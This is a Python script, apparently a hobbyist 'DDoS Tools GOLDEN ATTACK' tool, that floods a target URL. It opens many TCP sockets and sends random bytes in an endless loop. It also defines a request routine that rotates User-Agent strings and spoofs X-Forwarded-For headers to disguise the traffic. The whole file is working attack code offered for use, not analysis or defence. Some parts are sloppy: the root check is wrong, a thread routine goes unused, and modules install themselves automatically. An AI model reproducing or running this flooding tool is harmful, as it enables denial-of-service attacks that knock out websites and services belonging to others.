import socket
import random
import argparse
import time
import logging
from urllib.parse import urlparse
from threading import Thread, Lock
import os
import platform
# pip install pyfiglet
import pyfiglet

import importlib
import subprocess

required_modules = ["socket", "random", "argparse", "time",
                    "logging", "urllib", "threading", "os", "platform", "pyfiglet"]

for module in required_modules:
    try:
        importlib.import_module(module)
    except ImportError:
        subprocess.call(['pip', 'install', module])

ascii_banner = pyfiglet.figlet_format("DDoS Tools GOLDEN ATTACK\nBy GiuCoder")
print(ascii_banner)


if platform.system() == 'Linux':
    pass
else:
    print("This script must be run as root")

# Initialize global variables
stop_threads = False
lock = Lock()

# Define a list of User-Agent strings to use in the requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

# Define a list of HTTP methods to use in the requests
http_methods = ['GET', 'POST', 'HEAD']

# Define a list of IP addresses to use in the requests
ip_addresses = [
    '10.0.0.1',
    '192.168.0.1',
    '172.16.0.1',
]


def send_request(sock, bytes_to_send, delay):
    """Send a request to the target IP address"""
    while not stop_threads:
        try:
            # Choose a random User-Agent header
            user_agent = random.choice(user_agents)
            # Choose a random HTTP method
            http_method = random.choice(http_methods)
            # Choose a random IP address
            ip_address = random.choice(ip_addresses)
            # Set the User-Agent and X-Forwarded-For headers
            headers = f"User-Agent: {user_agent}\r\nX-Forwarded-For: {ip_address}\r\n"
            # Generate the request string
            request = f"{http_method} / HTTP/1.1\r\nHost : {sock.getpeername()[0]}\r\n{headers}\r\n"
            # Send the request
            sock.send(request.encode())
            sock.send(bytes_to_send)
            logging.debug('Sent {} bytes to {}'.format(
                len(bytes_to_send), sock.getpeername()))
            time.sleep(delay)
        except socket.timeout:
            logging.debug('Socket timed out')
            break
        except Exception as e:
            logging.debug('Error sending data : {}'.format(e))
            break


def create_socket(target_ip, target_port):
    """Create a socket and connect to the target IP address"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_ip, target_port))
        logging.debug('Connected to {}'.format(sock.getpeername()))
        return sock
    except socket.gaierror as e:
        logging.debug('Error resolving hostname: {}'.format(e))
        return None
    except ConnectionRefusedError:
        logging.debug('Connection refused')
        return None


def run_threads(target_ip, target_port, threads, bytes_to_send, delay):
    """Create and run a pool of threads"""
    sockets = []
    for i in range(threads):
        sock = create_socket(target_ip, target_port)
        if sock is not None:
            sockets.append(sock)

    threads = []
    for sock in sockets:
        t = Thread(target=send_request, args=(sock, bytes_to_send, delay))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for sock in sockets:
        sock.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, help='Target URL')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                        help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('-b', '--bytes', type=int, default=4096,
                        help='Number of bytes to send in each request (default: 4096)')
    args = parser.parse_args()

    # Parse the URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme.startswith('http'):
        print('Error: Invalid URL scheme')
        return
    if not parsed_url.netloc:
        print('Error: Invalid URL')
        return

    # Determine the target IP address and port
    try:
        target_ip = socket.gethostbyname(parsed_url.netloc)
    except socket.gaierror as e:
        print('Error resolving hostname:', e)
        return
    if not parsed_url.port:
        target_port = 80 if parsed_url.scheme == 'http' else 443
    else:
        target_port = parsed_url.port

    # Generate random bytes to send in the request
    bytes_to_send = bytes([random.randint(0, 255) for _ in range(args.bytes)])

    # Start the attack
    print('Starting attack on', args.url)
    try:
        sockets = []
        for i in range(args.threads):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            sockets.append(sock)
            print(f'Thread {i+1} connected to {target_ip}:{target_port}')

        while True:
            for sock in sockets:
                try:
                    sock.send(bytes_to_send)
                    print(
                        f'{sock.getsockname()} sent {args.bytes} bytes to {target_ip}')
                    time.sleep(args.delay)
                except BrokenPipeError:
                    print(f'{sock.getsockname()} connection closed by remote end')
                    sockets.remove(sock)
                except socket.timeout:
                    print(f'{sock.getsockname()} timed out')
                    sockets.remove(sock)
                except Exception as e:
                    print(f'{sock.getsockname()} error sending data:', e)
                    sockets.remove(sock)
    except KeyboardInterrupt:
        print('\nAttack stopped by user')
    finally:
        for sock in sockets:
            sock.close()


if __name__ == '__main__':
    main()
